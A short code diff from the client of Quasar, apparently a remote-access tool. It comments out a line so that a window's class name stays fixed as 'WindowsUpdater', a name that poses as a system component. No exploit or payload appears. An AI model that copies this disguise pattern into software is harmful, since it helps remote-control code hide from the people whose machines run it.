@@ -57,7 +57,7 @@ namespace Quasar.Client.Messages
                 string str = "WindowsUpdater"; // window class name
                 if (message.WindowClassName != null)
                 {
-                    str = message.WindowClassName;
+                   // str = message.WindowClassName;
                 }
                 int num = 36;
                 if (message.FontSize != 0)  // font size
